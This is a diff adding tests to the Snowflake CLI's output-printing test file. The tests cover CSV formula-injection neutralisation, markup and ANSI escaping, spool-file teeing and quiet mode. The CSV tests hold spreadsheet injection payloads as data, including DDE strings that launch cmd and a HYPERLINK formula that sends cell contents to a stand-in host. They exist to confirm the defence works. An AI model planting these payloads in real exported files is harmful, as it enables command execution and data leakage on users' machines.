@@ -12,6 +12,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+import csv
 import io
 import json
 import logging
@@ -26,7 +27,7 @@ import pytest
 from rich.cells import cell_len
 from rich.console import Console
 from snowflake.cli._app import ascii_table
-from snowflake.cli._app.printing import print_result
+from snowflake.cli._app.printing import print_raw, print_result
 from snowflake.cli.api.cli_global_context import get_cli_context_manager
 from snowflake.cli.api.output.formats import OutputFormat
 from snowflake.cli.api.output.types import (
@@ -137,7 +138,7 @@ array,object,date
 
 
 _PLAIN_ID_NAME_ROWS = [{"ID": "1", "NAME": "alice"}, {"ID": "2", "NAME": "bob"}]
-_PLAIN_ID_NAME_SNAPSHOT = "ID  NAME \n" "1   alice\n" "2   bob  \n"
+_PLAIN_ID_NAME_SNAPSHOT = "ID  NAME \n1   alice\n2   bob  \n"
 
 
 def test_plain_collection_result_has_no_box(capsys):
@@ -254,6 +255,15 @@ def test_query_result_no_duplicates_unchanged(mock_cursor):
     assert result.column_names == ["a", "b", "c"]
 
 
+def test_message_result_prints_rich_markup_as_text(capsys):
+    print_result(
+        MessageResult("Wrote connection org[/x]acct to /tmp/config.toml"),
+        output_format=OutputFormat.TABLE,
+    )
+
+    assert "org[/x]acct" in get_output(capsys)
+
+
 def test_print_markup_tags_in_output_do_not_raise_errors(capsys, mock_cursor):
     output_data = QueryResult(
         mock_cursor(
@@ -319,7 +329,7 @@ def test_print_nested_results_rereads_format_when_output_format_is_none(
     finally:
         manager.output_format = previous
 
-    assert output == ("+---+\n" "| n |\n" "|---|\n" "| 1 |\n" "+---+\n" "n\n" "2\n")
+    assert output == ("+---+\n| n |\n|---|\n| 1 |\n+---+\nn\n2\n")
 
 
 @pytest.mark.parametrize("wrapper", (MultipleResults, StreamResult))
@@ -1296,3 +1306,225 @@ def test_stderr_hint_tty_only_once(capsys, monkeypatch, caplog):
     _run()
     tty = capsys.readouterr()
     assert tty.err.count(ascii_table.LARGE_RESULT_HINT) == 1
+
+
+def _read_csv(text: str) -> list[list[str]]:
+    # newline="" keeps a carriage return inside a quoted field intact.
+    return list(csv.reader(io.StringIO(text, newline="")))
+
+
+@pytest.mark.parametrize(
+    ("payload", "cell"),
+    [
+        ("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"),
+        ("+1+cmd|'/c calc'!A0", "'+1+cmd|'/c calc'!A0"),
+        ("-2+3", "'-2+3"),
+        ("@SUM(1+1)", "'@SUM(1+1)"),
+        ("\t=1+1", "'\t=1+1"),
+        ("\r=1+1", "'\r=1+1"),
+        ("\x1b[0m=1+1", "'=1+1"),
+        ('=1+2";=1+2', "'=1+2\";=1+2"),
+    ],
+)
+def test_csv_neutralizes_formula_cells(capsys, mock_cursor, payload, cell):
+    print_result(
+        QueryResult(mock_cursor(columns=["name"], rows=[(payload,)])),
+        output_format=OutputFormat.CSV,
+    )
+    output = get_output(capsys)
+    assert _read_csv(output) == [["name"], [cell]]
+    # Python 3.10 leaves a bare CR unquoted; the written field must be quoted.
+    if "\r" in cell:
+        assert output == 'name\n"\'\r=1+1"\n'
+
+
+def test_csv_neutralizes_formula_headers(capsys, mock_cursor):
+    print_result(
+        QueryResult(mock_cursor(columns=['=HYPERLINK("http://x/"&A2)'], rows=[(1,)])),
+        output_format=OutputFormat.CSV,
+    )
+    header = next(csv.reader(io.StringIO(get_output(capsys))))
+    assert header == ['\'=HYPERLINK("http://x/"&A2)']
+
+
+def test_csv_neutralizes_object_and_message_results(capsys):
+    print_result(ObjectResult({"=k": "=v"}), output_format=OutputFormat.CSV)
+    assert get_output(capsys) == "'=k\n'=v\n"
+
+    print_result(MessageResult("=1+1"), output_format=OutputFormat.CSV)
+    assert get_output(capsys) == "message\n'=1+1\n"
+
+
+def test_csv_keeps_numbers_and_plain_text(capsys):
+    print_result(
+        CollectionResult(
+            [
+                {
+                    "n": -5,
+                    "d": Decimal("-1.5"),
+                    "f": -0.5,
+                    "s": "a-b",
+                    "e": "",
+                    "t": "-5",
+                }
+            ]
+        ),
+        output_format=OutputFormat.CSV,
+    )
+    assert get_output(capsys) == "n,d,f,s,e,t\n-5,-1.5,-0.5,a-b,,'-5\n"
+
+
+def test_json_and_table_do_not_prefix_formulas(capsys):
+    row = {"name": "=1+1"}
+    print_result(CollectionResult([row]), output_format=OutputFormat.JSON)
+    assert get_output_as_json(capsys) == [row]
+
+    print_result(CollectionResult([row]), output_format=OutputFormat.TABLE)
+    table = get_output(capsys)
+    assert "=1+1" in table
+    assert "'=1+1" not in table
+
+
+def test_print_raw_strips_ansi_and_tees_spool(capsys, tmp_path):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "echo.txt"
+    statement = "select '\x1b[31mred';"
+    try:
+        manager.open_spool(spool)
+        print_raw(statement)
+        terminal = get_output(capsys)
+        contents = spool.read_text(encoding="utf-8")
+    finally:
+        manager.close_spool()
+
+    assert "\x1b" not in terminal
+    assert "select 'red';\n" in terminal
+    assert contents == "select 'red';\n"
+
+
+def test_print_result_tees_while_spool_open(capsys, tmp_path):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "spool.txt"
+    try:
+        print_result(
+            CollectionResult([{"n": "before"}]), output_format=OutputFormat.PLAIN
+        )
+        manager.open_spool(spool)
+        print_result(
+            CollectionResult([{"n": "during-a"}]), output_format=OutputFormat.PLAIN
+        )
+        print_result(
+            CollectionResult([{"n": "during-b"}]), output_format=OutputFormat.PLAIN
+        )
+        manager.close_spool()
+        print_result(
+            CollectionResult([{"n": "after"}]), output_format=OutputFormat.PLAIN
+        )
+        terminal = get_output(capsys)
+        contents = spool.read_text(encoding="utf-8")
+    finally:
+        manager.close_spool()
+
+    assert "before" in terminal
+    assert "during-a" in terminal
+    assert "during-b" in terminal
+    assert "after" in terminal
+    assert "during-a" in contents
+    assert "during-b" in contents
+    assert "before" not in contents
+    assert "after" not in contents
+
+
+def test_print_result_spool_appends_existing_file(capsys, tmp_path):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "spool.txt"
+    spool.write_text("existing\n", encoding="utf-8")
+    try:
+        manager.open_spool(spool)
+        print_result(
+            CollectionResult([{"n": "appended"}]), output_format=OutputFormat.PLAIN
+        )
+        contents = spool.read_text(encoding="utf-8")
+    finally:
+        manager.close_spool()
+
+    assert "appended" in get_output(capsys)
+    assert contents.startswith("existing\n")
+    assert "appended" in contents
+
+
+@pytest.mark.parametrize("with_spool", [False, True])
+def test_print_result_quiet_unset_shows_table(capsys, tmp_path, with_spool):
+    """quiet is off until set, with or without a spool file."""
+    manager = get_cli_context_manager()
+    assert manager.quiet is False
+    spool = tmp_path / "spool.txt"
+    try:
+        if with_spool:
+            manager.open_spool(spool)
+        print_result(CollectionResult([{"n": "1"}]), output_format=OutputFormat.TABLE)
+        terminal = get_output(capsys)
+        contents = spool.read_text(encoding="utf-8") if with_spool else ""
+    finally:
+        manager.close_spool()
+
+    assert "| 1 |" in terminal
+    if with_spool:
+        assert "| 1 |" in contents
+
+
+@pytest.mark.parametrize("with_spool", [False, True])
+def test_print_result_quiet_false_shows_table(capsys, tmp_path, with_spool):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "spool.txt"
+    try:
+        manager.quiet = False
+        if with_spool:
+            manager.open_spool(spool)
+        print_result(CollectionResult([{"n": "1"}]), output_format=OutputFormat.TABLE)
+        terminal = get_output(capsys)
+        contents = spool.read_text(encoding="utf-8") if with_spool else ""
+    finally:
+        manager.quiet = False
+        manager.close_spool()
+
+    assert "| 1 |" in terminal
+    if with_spool:
+        assert "| 1 |" in contents
+
+
+@pytest.mark.parametrize("with_spool", [False, True])
+def test_print_result_quiet_true_hides_terminal(capsys, tmp_path, with_spool):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "spool.txt"
+    try:
+        manager.quiet = True
+        if with_spool:
+            manager.open_spool(spool)
+        print_result(CollectionResult([{"n": "1"}]), output_format=OutputFormat.TABLE)
+        terminal = get_output(capsys)
+        contents = spool.read_text(encoding="utf-8") if with_spool else ""
+    finally:
+        manager.quiet = False
+        manager.close_spool()
+
+    assert "| 1 |" not in terminal
+    assert terminal.strip() == ""
+    if with_spool:
+        assert "| 1 |" in contents
+
+
+def test_print_result_spool_json(capsys, tmp_path):
+    manager = get_cli_context_manager()
+    spool = tmp_path / "spool.json.txt"
+    try:
+        manager.open_spool(spool)
+        print_result(
+            CollectionResult([{"n": "json-row"}]), output_format=OutputFormat.JSON
+        )
+        contents = spool.read_text(encoding="utf-8")
+    finally:
+        manager.close_spool()
+
+    assert "json-row" in get_output(capsys)
+    assert "json-row" in contents
